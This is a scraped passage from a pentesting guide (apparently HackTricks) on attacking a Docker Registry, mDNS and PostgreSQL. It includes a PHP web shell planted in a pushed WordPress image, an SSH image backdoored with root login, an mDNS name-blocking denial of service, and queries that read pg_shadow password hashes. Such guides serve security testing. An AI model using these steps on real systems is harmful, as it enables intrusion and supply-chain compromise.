        "text": "5000 - Pentesting Docker Registry\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nInfo from\nhere\n.\nA\nDocker registry\nis a storage and distribution system for named Docker images. The same image might have multiple different versions, identified by their tags.\nA Docker registry is organized into\nDocker repositories\n, where a repository holds all the versions of a specific image. The registry allows Docker users to pull images locally, as well as push new images to the registry (given adequate access permissions when applicable).\nBy default, the Docker engine interacts with\nDockerHub\n, Docker‚Äôs public registry instance. However, it is possible to run on-premise the open-source Docker registry/distribution, as well as a commercially supported version called\nDocker Trusted Registry\n. There are other public registries available online.\nTo pull an image from an on-premises registry, you could run a command similar to:\ndocker pull my-registry:9000/foo/bar:2.1\nwhere you pull the version of\nfoo/bar\nimage with tag\n2.1\nfrom our on-premise registry located at\nmy-registry\ndomain, port\n9000\n.\nIf you used DockerHub instead, and 2.1 was also the latest version, you could run this command to pull the same image locally:\ndocker pull foo/bar\nDefault port:\n5000\nPORT    STATE SERVICE  VERSION\n5000/tcp open  http    Docker Registry (API: 2.0)\nDiscovering\nThe easiest way to discover this service running is get it on the output of nmap. Anyway, note that as it's a HTTP based service it can be behind HTTP proxies and nmap won't detect it.\nSome fingerprints:\nIf you access\n/\nnothing is returned in the response\nIf you access\n/v2/\nthen\n{}\nis returned\nIf you access\n/v2/_catalog\nyou may obtain:\n{\"repositories\":[\"alpine\",\"ubuntu\"]}\n{\"errors\":[{\"code\":\"UNAUTHORIZED\",\"message\":\"authentication required\",\"detail\":[{\"Type\":\"registry\",\"Class\":\"\",\"Name\":\"catalog\",\"Action\":\"*\"}]}]}\nEnumeration\nHTTP/HTTPS\nDocker registry may be configured to use\nHTTP\nor\nHTTPS\n. So the first thing you may need to do is\nfind which one\nis being configured:\ncurl\n-s\nhttp://10.10.10.10:5000/v2/_catalog\n#If HTTPS\nWarning: Binary output can mess up your terminal. Use\n\"--output -\"\nto tell\nWarning:\ncurl\nto output it to your terminal anyway, or consider\n\"--output\nWarning: <FILE>\"\nto save to a file.\n‚Äã\n#If HTTP\n{\n\"repositories\"\n:\n[\n\"alpine\"\n,\n\"ubuntu\"\n]}\nAuthentication\nDocker registry may also be configured to require\nauthentication\n:\ncurl\n-k\nhttps://192.25.197.3:5000/v2/_catalog\n#If Authentication required\n{\n\"errors\"\n:\n[{\n\"code\"\n:\n\"UNAUTHORIZED\"\n,\n\"message\"\n:\n\"authentication required\"\n,\n\"detail\"\n:\n[{\n\"Type\"\n:\n\"registry\"\n,\n\"Class\"\n:\n\"\"\n,\n\"Name\"\n:\n\"catalog\"\n,\n\"Action\"\n:\n\"*\"\n}]}]}\n#If no authentication required\n{\n\"repositories\"\n:\n[\n\"alpine\"\n,\n\"ubuntu\"\n]}\nIf the Docker Registry is requiring authentication you can\ntry to brute force it using this\n.\nIf you find valid credentials you will need to use them\nto enumerate the registry, in\ncurl\nyou can use them like this:\ncurl\n-k\n-u\nusername:password https://10.10.10.10:5000/v2/_catalog\nEnumeration using DockerRegistryGrabber\n‚Äã\nDockerRegistryGrabber\nis a python tool to enumerate / dump docker degistry (without or with basic authentication)\npython3 DockerGraber.py http://127.0.0.1\n--list\n‚Äã\n[\n+\n]\nmy-ubuntu\n[\n+\n]\nmy-ubuntu2\n‚Äã\npython3 DockerGraber.py http://127.0.0.1\n--dump_all\n‚Äã\n[\n+\n]\nmy-ubuntu\n[\n+\n]\nmy-ubuntu2\n[\n+\n]\nblobSum found\n5\n[\n+\n]\nDumping my-ubuntu\n[\n+\n]\nDownloading\n:\na3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4\n[\n+\n]\nDownloading\n:\nb39e2761d3d4971e78914857af4c6bd9989873b53426cf2fef3e76983b166fa2\n[\n+\n]\nDownloading\n:\nc8ee6ca703b866ac2b74b6129d2db331936292f899e8e3a794474fdf81343605\n[\n+\n]\nDownloading\n:\nc1de0f9cdfc1f9f595acd2ea8724ea92a509d64a6936f0e645c65b504e7e4bc6\n[\n+\n]\nDownloading\n:\n4007a89234b4f56c03e6831dc220550d2e5fba935d9f5f5bcea64857ac4f4888\n[\n+\n]\nblobSum found\n5\n[\n+\n]\nDumping my-ubuntu2\n[\n+\n]\nDownloading\n:\na3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4\n[\n+\n]\nDownloading\n:\nb39e2761d3d4971e78914857af4c6bd9989873b53426cf2fef3e76983b166fa2\n[\n+\n]\nDownloading\n:\nc8ee6ca703b866ac2b74b6129d2db331936292f899e8e3a794474fdf81343605\n[\n+\n]\nDownloading\n:\nc1de0f9cdfc1f9f595acd2ea8724ea92a509d64a6936f0e645c65b504e7e4bc6\n[\n+\n]\nDownloading\n:\n4007a89234b4f56c03e6831dc220550d2e5fba935d9f5f5bcea64857ac4f4888\n‚Äã\n‚Äã\npython3 DockerGraber.py http://127.0.0.1\n--dump\nmy-ubuntu\n‚Äã\n[\n+\n]\nblobSum found\n5\n[\n+\n]\nDumping my-ubuntu\n[\n+\n]\nDownloading\n:\na3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4\n[\n+\n]\nDownloading\n:\nb39e2761d3d4971e78914857af4c6bd9989873b53426cf2fef3e76983b166fa2\n[\n+\n]\nDownloading\n:\nc8ee6ca703b866ac2b74b6129d2db331936292f899e8e3a794474fdf81343605\n[\n+\n]\nDownloading\n:\nc1de0f9cdfc1f9f595acd2ea8724ea92a509d64a6936f0e645c65b504e7e4bc6\n[\n+\n]\nDownloading\n:\n4007a89234b4f56c03e6831dc220550d2e5fba935d9f5f5bcea64857ac4f4888\nEnumeration using curl\nOnce you\nobtained access to the docker registry\nhere are some commands you can use to enumerate it:\n#List repositories\ncurl\n-s\nhttp://10.10.10.10:5000/v2/_catalog\n{\n\"repositories\"\n:\n[\n\"alpine\"\n,\n\"ubuntu\"\n]}\n‚Äã\n#Get tags of a repository\ncurl\n-s\nhttp://192.251.36.3:5000/v2/ubuntu/tags/list\n{\n\"name\"\n:\n\"ubuntu\"\n,\n\"tags\"\n:\n[\n\"14.04\"\n,\n\"12.04\"\n,\n\"18.04\"\n,\n\"16.04\"\n]}\n‚Äã\n#Get manifests\ncurl\n-s\nhttp://192.251.36.3:5000/v2/ubuntu/manifests/latest\n{\n\"schemaVersion\"\n:\n1\n,\n\"name\"\n:\n\"ubuntu\"\n,\n\"tag\"\n:\n\"latest\"\n,\n\"architecture\"\n:\n\"amd64\"\n,\n\"fsLayers\"\n:\n[\n{\n\"blobSum\"\n:\n\"sha256:2a62ecb2a3e5bcdbac8b6edc58fae093a39381e05d08ca75ed27cae94125f935\"\n}\n,\n{\n\"blobSum\"\n:\n\"sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4\"\n}\n,\n{\n\"blobSum\"\n:\n\"sha256:e7c96db7181be991f19a9fb6975cdbbd73c65f4a2681348e63a141a2192a5f10\"\n}\n]\n,\n\"history\"\n:\n[\n{\n\"v1Compatibility\"\n:\n\"{\n\\\"\narchitecture\n\\\"\n:\n\\\"\namd64\n\\\"\n,\n\\\"\nconfig\n\\\"\n:{\n\\\"\nHostname\n\\\"\n:\n\\\"\\\"\n,\n\\\"\nDomainname\n\\\"\n:\n\\\"\\\"\n,\n\\\"\nUser\n\\\"\n:\n\\\"\\\"\n,\n\\\"\nAttachStdin\n\\\"\n:false,\n\\\"\nAttachStdout\n\\\"\n:false,\n\\\"\nAttachStderr\n\\\"\n:false,\n\\\"\nTty\n\\\"\n:false,\n\\\"\nOpenStdin\n\\\"\n:false,\n\\\"\nStdinOnce\n\\\"\n:false,\n\\\"\nEnv\n\\\"\n:[\n\\\"\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n\\\"\n],\n\\\"\nCmd\n\\\"\n:[\n\\\"\n/bin/sh\n\\\"\n],\n\\\"\nArgsEscaped\n\\\"\n:true,\n\\\"\nImage\n\\\"\n:\n\\\"\nsha256:055936d3920576da37aa9bc460d70c5f212028bda1c08c0879aedf03d7a66ea1\n\\\"\n,\n\\\"\nVolumes\n\\\"\n:null,\n\\\"\nWorkingDir\n\\\"\n:\n\\\"\\\"\n,\n\\\"\nEntrypoint\n\\\"\n:null,\n\\\"\nOnBuild\n\\\"\n:null,\n\\\"\nLabels\n\\\"\n:null},\n\\\"\ncontainer_config\n\\\"\n:{\n\\\"\nHostname\n\\\"\n:\n\\\"\\\"\n,\n\\\"\nDomainname\n\\\"\n:\n\\\"\\\"\n,\n\\\"\nUser\n\\\"\n:\n\\\"\\\"\n,\n\\\"\nAttachStdin\n\\\"\n:false,\n\\\"\nAttachStdout\n\\\"\n:false,\n\\\"\nAttachStderr\n\\\"\n:false,\n\\\"\nTty\n\\\"\n:false,\n\\\"\nOpenStdin\n\\\"\n:false,\n\\\"\nStdinOnce\n\\\"\n:false,\n\\\"\nEnv\n\\\"\n:[\n\\\"\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n\\\"\n],\n\\\"\nCmd\n\\\"\n:[\n\\\"\n/bin/sh\n\\\"\n,\n\\\"\n-c\n\\\"\n,\n\\\"\n#(nop) COPY file:96c69e5db7e6d87db2a51d3894183e9e305a144c73659d5578d300bd2175b5d6 in /etc/network/if-post-up.d\n\\\"\n],\n\\\"\nArgsEscaped\n\\\"\n:true,\n\\\"\nImage\n\\\"\n:\n\\\"\nsha256:055936d3920576da37aa9bc460d70c5f212028bda1c08c0879aedf03d7a66ea1\n\\\"\n,\n\\\"\nVolumes\n\\\"\n:null,\n\\\"\nWorkingDir\n\\\"\n:\n\\\"\\\"\n,\n\\\"\nEntrypoint\n\\\"\n:null,\n\\\"\nOnBuild\n\\\"\n:null,\n\\\"\nLabels\n\\\"\n:null},\n\\\"\ncreated\n\\\"\n:\n\\\"\n2019-05-13T14:06:51.794876531Z\n\\\"\n,\n\\\"\ndocker_version\n\\\"\n:\n\\\"\n18.09.4\n\\\"\n,\n\\\"\nid\n\\\"\n:\n\\\"\n911999e848d2c283cbda4cd57306966b44a05f3f184ae24b4c576e0f2dfb64d0\n\\\"\n,\n\\\"\nos\n\\\"\n:\n\\\"\nlinux\n\\\"\n,\n\\\"\nparent\n\\\"\n:\n\\\"\nebc21e1720595259c8ce23ec8af55eddd867a57aa732846c249ca59402072d7a\n\\\"\n}\"\n}\n,\n{\n\"v1Compatibility\"\n:\n\"{\n\\\"\nid\n\\\"\n:\n\\\"\nebc21e1720595259c8ce23ec8af55eddd867a57aa732846c249ca59402072d7a\n\\\"\n,\n\\\"\nparent\n\\\"\n:\n\\\"\n7869895562ab7b1da94e0293c72d05b096f402beb83c4b15b8887d71d00edb87\n\\\"\n,\n\\\"\ncreated\n\\\"\n:\n\\\"\n2019-05-11T00:07:03.510395965Z\n\\\"\n,\n\\\"\ncontainer_config\n\\\"\n:{\n\\\"\nCmd\n\\\"\n:[\n\\\"\n/bin/sh -c #(nop)  CMD [\n\\\\\\\"\n/bin/sh\n\\\\\\\"\n]\n\\\"\n]},\n\\\"\nthrowaway\n\\\"\n:true}\"\n}\n,\n{\n\"v1Compatibility\"\n:\n\"{\n\\\"\nid\n\\\"\n:\n\\\"\n7869895562ab7b1da94e0293c72d05b096f402beb83c4b15b8887d71d00edb87\n\\\"\n,\n\\\"\ncreated\n\\\"\n:\n\\\"\n2019-05-11T00:07:03.358250803Z\n\\\"\n,\n\\\"\ncontainer_config\n\\\"\n:{\n\\\"\nCmd\n\\\"\n:[\n\\\"\n/bin/sh -c #(nop) ADD file:a86aea1f3a7d68f6ae03397b99ea77f2e9ee901c5c59e59f76f93adbb4035913 in /\n\\\"\n]}}\"\n}\n]\n,\n\"signatures\"\n:\n[\n{\n\"header\"\n:\n{\n\"jwk\"\n:\n{\n\"crv\"\n:\n\"P-256\"\n,\n\"kid\"\n:\n\"DJNH:N6JL:4VOW:OTHI:BSXU:TZG5:6VPC:D6BP:6BPR:ULO5:Z4N4:7WBX\"\n,\n\"kty\"\n:\n\"EC\"\n,\n\"x\"\n:\n\"leyzOyk4EbEWDY0ZVDoU8_iQvDcv4hrCA0kXLVSpCmg\"\n,\n\"y\"\n:\n\"Aq5Qcnrd-6RO7VhUS2KPpftoyjjBWVoVUiaPluXq4Fg\"\n}\n,\n\"alg\"\n:\n\"ES256\"\n}\n,\n\"signature\"\n:\n\"GIUf4lXGzdFk3aF6f7IVpF551UUqGaSsvylDqdeklkUpw_wFhB_-FVfshodDzWlEM8KI-00aKky_FJez9iWL0Q\"\n,\n\"protected\"\n:\n\"eyJmb3JtYXRMZW5ndGgiOjI1NjQsImZvcm1hdFRhaWwiOiJDbjAiLCJ0aW1lIjoiMjAyMS0wMS0wMVQyMDoxMTowNFoifQ\"\n}\n]\n}\n‚Äã\n#Download one of the previously listed blobs\ncurl\nhttp://10.10.10.10:5000/v2/ubuntu/blobs/sha256:2a62ecb2a3e5bcdbac8b6edc58fae093a39381e05d08ca75ed27cae94125f935\n--output\nblob1.tar\n‚Äã\n#Inspect the insides of each blob\ntar\n-xf\nblob1.tar\n#After this,inspect the new folders and files created in the current directory\nNote that when you download and decompress the blobs files and folders will appear in the current directory.\nIf you download all the blobs and decompress them in the same folder they will overwrite values from the previously decompressed blobs\n, so be careful. It may be interesting to decompress each blob inside a different folder to inspect the exact content of each blob.\nEnumeration using docker\n#Once you know which images the server is saving (/v2/_catalog) you can pull them\ndocker\npull\n10.10\n.10.10:5000/ubuntu\n‚Äã\n#Check the commands used to create the layers of the image\ndocker\nhistory\n10.10\n.10.10:5000/ubuntu\n#IMAGE               CREATED             CREATED BY                                      SIZE                COMMENT\n#ed05bef01522        2 years ago         ./run.sh                                        46.8MB\n#<missing>           2 years ago         /bin/sh -c #(nop)  CMD [\"./run.sh\"]             0B\n#<missing>           2 years ago         /bin/sh -c #(nop)  EXPOSE 80                    0B\n#<missing>           2 years ago         /bin/sh -c cp $base/mysql-setup.sh /            499B\n#<missing>           2 years ago         /bin/sh -c #(nop) COPY dir:0b657699b1833fd59‚Ä¶   16.2MB\n‚Äã\n#Run and get a shell\ndocker\nrun\n-it\n10.10\n.10.10:5000/ubuntu\nbash\n#Leave this shell running\ndocker\nps\n#Using a different shell\ndocker\nexec\n-it\n7d3a81fe42d7\nbash\n#Get ash shell inside docker container\nBackdooring WordPress image\nIn the scenario where you have found a Docker Registry saving a wordpress image you can backdoor it.\nCreate\nthe\nbackdoor\n:\nshell.php\n<\n?php\necho\nshell_exec\n(\n$_GET\n[\n\"cmd\"\n]);\n?\n>\nCreate a\nDockerfile\n:\nDockerfile\nFROM\n10.10\n.10.10:5000/wordpress\nCOPY shell.php /app/\nRUN\nchmod\n777\n/app/shell.php\nCreate\nthe new image,\ncheck\nit's created, and\npush\nit:\ndocker\nbuild\n-t\n10.10\n.10.10:5000/wordpress\n.\n#Create\ndocker\nimages\ndocker\npush registry:5000/wordpress\n#Push it\nBackdooring SSH server image\nSuppose that you found a Docker Registry with a SSH image and you want to backdoor it.\nDownload\nthe image and\nrun\nit:\ndocker\npull\n10.10\n.10.10:5000/sshd-docker-cli\ndocker\nrun\n-d\n10.10\n.10.10:5000/sshd-docker-cli\nExtract the\nsshd_config\nfile from the SSH image:\ndocker\ncp\n4c989242c714:/etc/ssh/sshd_config\n.\nAnd modify it to set:\nPermitRootLogin yes\nCreate a\nDockerfile\nlike the following one:\nDockerfile\nFROM\n10.10\n.10.10:5000/sshd-docker-cli\nCOPY sshd_config /etc/ssh/\nRUN\necho\nroot:password\n|\nchpasswd\nCreate\nthe new image,\ncheck\nit's created, and\npush\nit:\ndocker\nbuild\n-t\n10.10\n.10.10:5000/sshd-docker-cli\n.\n#Create\ndocker\nimages\ndocker\npush registry:5000/sshd-docker-cli\n#Push it\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n4786 - Cisco Smart Install\nNext\n- Network Services Pentesting\n5353/UDP Multicast DNS (mDNS) and DNS-SD\nLast modified\n6mo ago"
    },
    {
        "title": "5353/UDP Multicast DNS (mDNS) and DNS-SD",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/5353-udp-multicast-dns-mdns",
        "text": "5353/UDP Multicast DNS (mDNS) and DNS-SD\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nMulticast DNS (mDNS) is a\nzero-configuration protocol\nthat lets you perform\nDNS-like operations\non the local network in the absence of a conventional, unicast DNS server. The protocol uses the\nsame\nAPI,\npacket formats\n, and operating semantics as DNS, allowing you to resolve domain names on the local network.\nDNS Service Discovery (DNS-SD)\nis a protocol that allows clients to\ndiscover a list of named instances of services\n(such as test._ipps._tcp.local, or linux._ssh._tcp.local) in a domain using standard DNS queries. DNS-SD is most often used in conjunction with mDNS but isn‚Äôt dependent on it. They‚Äôre both used by many IoT devices, such as network printers, Apple TVs, Google Chromecast, Network-Attached Storage (NAS) devices, and cameras.\nDefault port:\n5353/UDP\nPORT     STATE SERVICE\n5353/udp open  zeroconf\nHow mDNS Works\nDevices use mDNS when the local network\nlacks\na conventional\nunicast DNS server\n. To resolve a domain name for a local address using mDNS, the device sends a\nDNS query for a domain name\nending with\n.local\nto the\nmulticast\naddress\n224.0.0.251 (for IPv4) or FF02::FB (for IPv6). You can also use mDNS to resolve\nglobal domain names\n(non .local ones), but mDNS implementations are supposed to\ndisable\nthis behavior by default. mDNS requests and responses use\nUDP\nand\nport 5353\nas both the source and destination port.\nThe mDNS replies contain several important flags, including a\nTime-to- Live\n(TTL) value that signifies how many seconds the record is valid. Sending a reply with\nTTL=0 means that the corresponding record should be cleared\n. Another important flag is the QU bit, which denotes whether or not the query is a unicast query. If the\nQU bit isn‚Äôt set\n, the packet is a\nmulticast\nquery (QM). Because it‚Äôs possible to\nreceive unicast queries outside of the local link\n, secure mDNS implementations should always\ncheck that the source address in the packet matches the local subnet address range\n.\nHow DNS-SD Works\nDNS-SD allows clients to\ndiscover available services on the network\n. To use it, clients send standard DNS queries for pointer records (PTR), which map the type of service to a list of names of specific instances of that type of service.\nTo request a PTR record, clients use the name form \"<Service>.<Domain>\". The\n<Service>\npart the\nservice name\npreceded by \"_\" (for example, _ipps, _printer, or _ipp) and either\n_tcp or _udp\n. The\n<Domain>\nportion is \"\n.local\n\".\nResponders\nthen return the PTR records that point to the accompanying\nservice (SRV)\nand\ntext (TXT) records\n. Here is an example of a PTR record:\n_ipps._tcp.local: type PTR, class IN, test._ipps._tcp.local\nThe part of the PTR record to the\nleft\nof the colon is its\nname\n, and the part on the\nright\nis the\nSRV\nrecord\nto which the PTR record points. The\nSRV\nrecord lists the target\nhost\nand\nport\nwhere the\nservice\ninstance can be reached. For example, the next image shows a \"test._ipps._tcp.local\" SRV record in Wireshark in host ubuntu.local and port 8000:\nTherefore, the\nname of the SRV\nrecord is\nlike\nthe\nPTR\nrecord\npreceded\nby the\n<Instance>\nname (test in this case). The\nTXT\nhas the\nsame\nname\nas the\nSRV\nrecord and contains the information needed when the IP address and port number (contained in the SRV record) for a service aren‚Äôt sufficient to identify it.\nEnumeration\nnmap\nnmap\n-Pn\n-sUC\n-p5353\n192.168\n.1.2\n‚Äã\nStarting Nmap\n6.46\n(\nhttp://nmap.org\n)\nat\n2015\n-01-01\n10\n:30 GMT\nNmap scan report\nfor\n192.168\n.1.2\nPORT     STATE SERVICE\n5353\n/udp\nopen\nzeroconf\n|\ndns-service-discovery:\n|\n9\n/tcp workstation\n|\nAddress\n=\n192.168\n.1.2\n|\n22\n/tcp\nssh\n|\nAddress\n=\n192.168\n.1.2\n|\n22\n/tcp sftp-ssh\n|\nAddress\n=\n192.168\n.1.2\n|\n445\n/tcp smb\n|\nAddress\n=\n192.168\n.1.2\nNetwork Enumeration\nYou can learn a lot about the local network by simply sending mDNS requests and capturing multicast mDNS traffic.\nYou can use the tool\nPholus\nto send a mDNS requests (-rq) on the local network and capture multicast mDNS traffic (for -stimeout 10 seconds):\nsudo\npython3 pholus3.py eth0\n-rq\n-stimeout\n10\nAttacks\nAbusing the mDNS Probing Phase\nWhen a mDNS responder starts or changes its connectivity, it asks the local network if there is\nany resource with the name he plans to use\n. If the answer contains the record in question, the probing host\nshould choose a new name\n. If 15 conflicts take place within 10 seconds, the host must then wait at least five seconds before any additional attempt. Additionally, if one minute passes during which the host can‚Äôt find an unused name, it reports an error to the user.\nThe following command line will prevent any new device to get any new name as it will indicate that\nany name is already taken\n:\nsudo\npython pholus.py eth0\n-afre\n-stimeout\n1000\nSpoofing/MitM\nThe most interesting attack you can perform over this service is to perform a\nMitM\nin the\ncommunication between the client and the real server\n. You might be able to obtain sensitive files (MitM the communication with the printer) of even credentials (Windows authentication).\nFor more information check:\nSpoofing LLMNR, NBT-NS, mDNS/DNS and WPAD and Relay Attacks\nReferences\n‚Äã\nPractical IoT Hacking: The Definitive Guide to Attacking the Internet of Things\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n5000 - Pentesting Docker Registry\nNext\n- Network Services Pentesting\n5432,5433 - Pentesting Postgresql\nLast modified\n6mo ago"
    },
    {
        "title": "5432,5433 - Pentesting Postgresql",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql",
        "text": "5432,5433 - Pentesting Postgresql\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nPostgreSQL\nis an open source object-relational database system that uses and extends the SQL language.\nDefault port:\n5432, and if this port is already in use it seems that postgresql will use the next port (5433 probably) which is not in use.\nPORT     STATE SERVICE\n5432/tcp open  pgsql\nConnect & Basic Enum\npsql\n-U\n<\nmyuser\n>\n# Open psql console with user\npsql\n-h\n<\nhost\n>\n-U\n<\nusername\n>\n-d\n<\ndatabase\n>\n# Remote connection\npsql\n-h\n<\nhost\n>\n-p\n<\nport\n>\n-U\n<\nusername\n>\n-W\n<\npassword\n>\n<\ndatabase\n>\n# Remote connection\npsql\n-\nh localhost\n-\nd\n<\ndatabase_name\n>\n-\nU\n<\nUser\n>\n#Password will be prompted\n\\list\n# List databases\n\\c\n<\ndatabase\n>\n# use the database\n\\d\n# List tables\n\\du\n+\n# Get users roles\n‚Äã\n# Get current user\nSELECT\nuser\n;\n‚Äã\n# Get current database\nSELECT\ncurrent_catalog\n;\n‚Äã\n# List schemas\nSELECT\nschema_name\n,\nschema_owner\nFROM\ninformation_schema\n.\nschemata\n;\n\\dn\n+\n‚Äã\n#List databases\nSELECT\ndatname\nFROM\npg_database\n;\n‚Äã\n#Read credentials (usernames + pwd hash)\nSELECT\nusename\n,\npasswd\nfrom\npg_shadow\n;\n‚Äã\n# Get languages\nSELECT\nlanname\n,\nlanacl\nFROM\npg_language\n;\n‚Äã\n# Show installed extensions\nSHOW\nrds\n.\nextensions\n;\nSELECT\n*\nFROM\npg_extension\n;\n‚Äã\n# Get history of commands executed\n\\s\nIf running\n\\list\nyou find a database called\nrdsadmin\nyou know you are inside an\nAWS postgresql database\n.\nFor more information about\nhow to abuse a PostgreSQL database\ncheck:\nPostgreSQL injection\nAutomatic Enumeration\nmsf> use auxiliary/scanner/postgres/postgres_version\nmsf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection\n‚Äã\nBrute force\n‚Äã\nPort scanning\nAccording to\nthis research\n, when a connection attempt fails,\ndblink\nthrows an\nsqlclient_unable_to_establish_sqlconnection\nexception including an explanation of the error. Examples of these details are listed below.\nSELECT\n*\nFROM\ndblink_connect\n(\n'host=1.2.3.4\nport=5678\nuser=name\npassword=secret\ndbname=abc\nconnect_timeout=10'\n);\nHost is down\nDETAIL: could not connect to server: No route to host Is the server running on host \"1.2.3.4\" and accepting TCP/IP connections on port 5678?\nPort is closed\nDETAIL:  could not connect to server: Connection refused Is  the  server\nrunning on host \"1.2.3.4\" and accepting TCP/IP connections on port 5678?\nPort is open\nDETAIL:  server closed the connection unexpectedly This  probably  means\nthe server terminated abnormally before or while processing the request\nor\nDETAIL:  FATAL:  password authentication failed for user \"name\"\nPort is open or filtered\nDETAIL:  could not connect to server: Connection timed out Is the server\nrunning on host \"1.2.3.4\" and accepting TCP/IP connections on port 5678?\nUnfortunately, there does not seem to be a way of getting the exception details within a PL/pgSQL function. But you can get the details if you can connect directly to the PostgreSQL server. If it is not possible to get usernames and passwords directly out of the system tables, the wordlist attack described in the previous section might prove successful.\nEnumeration of Privileges\nRoles\nRole Types\nText\nrolsuper\nRole has superuser privileges\nrolinherit\nRole automatically inherits privileges of roles it is a member of\nrolcreaterole\nRole can create more roles\nrolcreatedb\nRole can create databases\nrolcanlogin\nRole can log in. That is, this role can be given as the initial session authorization identifier\nrolreplication\nRole is a replication role. A replication role can initiate replication connections and create and drop replication slots.\nrolconnlimit\nFor roles that can log in, this sets maximum number of concurrent connections this role can make. -1 means no limit.\nrolpassword\nNot the password (always reads as\n********\n)\nrolvaliduntil\nPassword expiry time (only used for password authentication); null if no expiration\nrolbypassrls\nRole bypasses every row-level security policy, see\nSection 5.8\nfor more information.\nrolconfig\nRole-specific defaults for run-time configuration variables\noid\nID of role\nInteresting Groups\nIf you are a member of\npg_execute_server_program\nyou can\nexecute\nprograms\nIf you are a member of\npg_read_server_files\nyou can\nread\nfiles\nIf you are a member of\npg_write_server_files\nyou can\nwrite\nfiles\nNote that in Postgres a\nuser\n, a\ngroup\nand a\nrole\nis the\nsame\n. It just depend on\nhow you use it\nand if you\nallow it to login\n.\n# Get users roles\n\\du\n‚Äã\n#Get users roles & groups\n# r.rolpassword\n# 